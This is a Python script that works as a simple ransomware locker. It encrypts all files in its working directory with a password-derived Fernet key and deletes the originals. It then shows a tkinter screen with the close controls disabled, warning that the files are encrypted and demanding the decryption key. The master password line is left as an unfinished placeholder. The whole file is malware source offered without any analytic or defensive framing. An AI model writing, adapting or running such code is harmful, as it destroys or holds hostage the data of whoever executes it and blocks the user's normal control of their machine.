import os
import base64
import hashlib
import tkinter as tk
from cryptography.fernet import Fernet, InvalidToken

# ---------------- CONFIG ----------------
THIS_FILE = os.path.basename(__file__)
MASTER_PASSWORD = #your key here

# ---------------- KEY GENERATION ----------------
def generate_key_from_password(password: str) -> bytes:
    key = hashlib.sha256(password.encode()).digest()
    return base64.urlsafe_b64encode(key)

# ---------------- ENCRYPT ----------------
def encrypt_all_files(key):
    fernet = Fernet(key)

    for file in os.listdir():
        if file == THIS_FILE or file.endswith(".encrypted"):
            continue

        if os.path.isfile(file):
            with open(file, "rb") as f:
                data = f.read()

            encrypted = fernet.encrypt(data)

            with open(file + ".encrypted", "wb") as f:
                f.write(encrypted)

            os.remove(file)

# ---------------- DECRYPT ----------------
def decrypt_files():
    password = entry.get()
    key = generate_key_from_password(password)
    fernet = Fernet(key)

    try:
        for file in os.listdir():
            if file.endswith(".encrypted"):
                with open(file, "rb") as f:
                    data = f.read()

                decrypted = fernet.decrypt(data)

                original = file.replace(".encrypted", "")
                with open(original, "wb") as f:
                    f.write(decrypted)

                os.remove(file)

        root.destroy()   # ✅ ONLY WAY TO EXIT

    except InvalidToken:
        error_label.config(text="❌ WRONG KEY", fg="red")

# ---------------- DISABLE WINDOW CLOSE ----------------
def disable_close(event=None):
    return "break"

# ---------------- CUSTOM WARNING WINDOW ----------------
def show_custom_message():
    popup = tk.Toplevel()
    popup.title("WARNING")
    popup.geometry("700x400")
    popup.configure(bg="black")
    popup.resizable(False, False)

    popup.protocol("WM_DELETE_WINDOW", disable_close)

    tk.Label(
        popup,
        text="⚠ FILES ENCRYPTED ⚠",
        fg="red",
        bg="black",
        font=("Arial", 20, "bold")
    ).pack(pady=20)

    tk.Label(
        popup,
        text="Your files have been encrypted.Provide correct Key to Decrypt",
        fg="white",
        bg="black",
        font=("Arial", 14)
    ).pack(pady=10)

    tk.Button(
        popup,
        text="OK",
        command=popup.destroy,
        bg="red",
        fg="black",
        font=("Arial", 12, "bold"),
        width=10
    ).pack(pady=20)

# ---------------- MAIN ----------------
FERNET_KEY = generate_key_from_password(MASTER_PASSWORD)
encrypt_all_files(FERNET_KEY)

root = tk.Tk()
root.title("Encrypted Folder")
root.geometry("420x260")
root.configure(bg="black")
root.resizable(False, False)

#  DISABLE CLOSE METHODS
root.protocol("WM_DELETE_WINDOW", disable_close)
root.bind("<Alt-F4>", disable_close)

show_custom_message()

tk.Label(root, text="Enter Decryption Key:", fg="red", bg="black").pack(pady=10)

entry = tk.Entry(root, show="*", width=30)
entry.pack()

tk.Button(root, text="Decrypt Files", command=decrypt_files).pack(pady=10)

error_label = tk.Label(root, text="", bg="black", font=("Arial", 10, "bold"))
error_label.pack()

root.mainloop()




